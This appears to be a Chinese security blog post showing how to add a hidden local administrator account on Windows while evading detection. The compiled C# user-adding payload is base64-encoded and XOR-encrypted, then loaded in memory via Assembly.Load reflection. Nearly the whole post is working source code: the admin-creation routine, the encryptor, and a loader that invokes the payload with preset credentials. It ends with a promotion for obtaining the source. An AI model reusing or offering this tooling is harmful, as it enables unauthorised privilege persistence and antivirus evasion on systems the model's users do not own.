看下nickname~

### 1.1 反射

`Assembly.Load()`是从`String`或`AssemblyName`类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘

`Assembly.LoadFrom()`从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集

例如：

`Assembly.LoadFrom("a.dll")`，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll

`Assembly.LoadFile()`也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集

例如：

`Assembly.LoadFile("a.dll")`，如果a.dll中引用了b.dll，那么不会加载b.dll。

1. **testcalc.exe**
    
    
    using System;
    namespace TestApplication
    {
        public class Program
        {
                public static void Main()
                {
                    Console.WriteLine("Main");
                }
        }
        public class aaa
        {
                public static void bbb()
                {
                    System.Diagnostics.Process p = new System.Diagnostics.Process();
                    p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
                    p.Start();
                }
        }
    }

2. **read exe**
    
    
    using System;
    using System.Reflection;
    namespace TestApplication
    {
        public class Program
        {
            public static void Main()
            {
    
                byte[] buffer = System.IO.File.ReadAllBytes("testcalc.exe");
                string base64str = Convert.ToBase64String(buffer);
                Console.WriteLine(base64str);
            }
        }
    }

3. **调用**
    
    
    using System;
    using System.Reflection;
    namespace TestApplication
    {
        public class Program
        {
            public static void Main()
            {
    
                string base64str = read exe读取的内容;
                byte[] buffer = Convert.FromBase64String(base64str);
    
                Assembly assembly = Assembly.Load(buffer);          
                Type type = assembly.GetType("TestApplication.aaa");
                MethodInfo method = type.GetMethod("bbb");
                Object obj = assembly.CreateInstance(method.Name);            
                method.Invoke(obj, null);
            }
        }
    }

### 1.2 正常添加用户

首先通过`string hostname =
Dns.GetHostName();`来获取当前主机名然后调用`DirectoryEntry`类创建一个计算机对象，创建一个名为`DE`的计算机对象，并连接到`Windows
NT Domain` 。

    
    
    string hostname = Dns.GetHostName();
    DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");

vs调试得到`entry.SchemaClassName`会遍历本地用户，以及组名。

![](./img/1992122812859535222.png)

![](./img/6289230940156101598.png)

![](./img/4024198315172662918.png)

![](./img/251959219381017815.png)

所以可以通过如下方法获取本地组存在哪些。

    
    
    public static void ListGroup(string hostname,DirectoryEntry DE)
    {
        hostname = Dns.GetHostName();
        DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
        foreach (DirectoryEntry entry in DE.Children)
        {
            if (entry.SchemaClassName == "Group")
            {
                Console.WriteLine(entry.Name);
            }
        }
    }

为什么要获取组名有哪些？因为某些机器可能不是英文系统而是一些小众系统。

如果要添加用户：

    
    
    public static void Add(string username,string password,DirectoryEntry DE)
    {
        DirectoryEntry user = DE.Children.Add(username, "user");
        user.Invoke("SetPassword", new object[] { password });
        user.CommitChanges();
    
        DirectoryEntry group;
        group = DE.Children.Find("Administrators", "group");
        if (group != null) { group.Invoke("Add", new object[] { user.Path.ToString() }); }
        Console.WriteLine("[+]" + username + " Created Success");
        Console.WriteLine("[+]" + username + " add to group Success");
    }

`username`为要创建或修改的用户的名称。`user`为用户对象的新实例，表示我们添加一个用户。`CommitChanges`方法就是更新目录数据库。同理将该用户添加到administrators组。然后我们借助反射来进行操作。

首先把添加用户方法写入`MethodAdd.exe`。代码为：

    
    
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Net;
    using System.Text;
    using System.Threading.Tasks;
    using System.DirectoryServices;
    
    namespace MethodAdd
    {
        internal class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine("hello world");
            }
        }
        public class aaa
        {
            public static void bbb(string username,string password)
            {
                string hostname = Dns.GetHostName();
                DirectoryEntry DE = new DirectoryEntry("WinNT://" + hostname + ",computer");
                DirectoryEntry user = DE.Children.Add(username, "user");
                user.Invoke("SetPassword", new object[] { password });
                user.CommitChanges();
    
                DirectoryEntry group;
                group = DE.Children.Find("Administrators", "group");
                if (group != null) { group.Invoke("Add", new object[] { user.Path.ToString() }); }
                Console.WriteLine("[+]" + username + " Created Success");
                Console.WriteLine("[+]" + username + " add to group Success");
            }
        }
    }

然后读取该exe并且进行异或加密

    
    
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    
    namespace ReadExe
    {
        internal class Program
        {
            public static char[] Encrypt(string content, string secretKey)
            {
                char[] data = content.ToCharArray();
                char[] key = secretKey.ToCharArray();
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] ^= key[i % key.Length];
                }
    
                return data;
            }
            static void Main(string[] args)
            {
                byte[] buffer = System.IO.File.ReadAllBytes("C:\\Users\\Administrator\\Desktop\\忘川武器\\c#\\MethodAdd\\MethodAdd\\bin\\Release\\MethodAdd.exe");
                string base64str = Convert.ToBase64String(buffer);
                string filePath ="base64.txt";
                char[] data = Encrypt(base64str, "ikun");
                string afterEncrypt = new string(data);
                File.WriteAllText(filePath, afterEncrypt);
            }
        }

写入当前路径的`base64.txt`。

![](./img/7748983005708922403.png)

然后loader进行读取`base64.txt`。并且进行异或解密再`base64`解密。

    
    
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    using System.DirectoryServices;
    using System.Net;
    using System.Reflection;
    using System.IO;
    
    namespace SharpAddUser
    {
        internal class Program
        {
            public static string Decrypt(char[] data, string secretKey)
            {
                char[] key = secretKey.ToCharArray();
    
                for (int i = 0; i < data.Length; i++)
                {
                    data[i] ^= key[i % key.Length];
                }
    
                return new string(data);
            }
            static void Main(string[] args)
            {
                string base64strPaht = "C: \\Users\\Administrator\\Desktop\\忘川武器\\c#\\ReadExe\\ReadExe\\bin\\Release\\base64.txt";
                string str1 = File.ReadAllText(base64strPaht, Encoding.Default);
                char[] data1 = str1.ToCharArray();
                string base64str = Decrypt(data1, "ikun");
                byte[] buffer = Convert.FromBase64String(base64str);
                Assembly assembly = Assembly.Load(buffer);
                Type type = assembly.GetType("MethodAdd.aaa");
                MethodInfo method = type.GetMethod("bbb");
                Object obj = assembly.CreateInstance(method.Name);
                method.Invoke(obj, new object[] { "test", "test123.." });
            }
        }
    }

![](./img/5265715677523965921.png)

![](./img/3292497068763352300.png)

**关注忘川安全输入：bypassadduser 获取源代码**

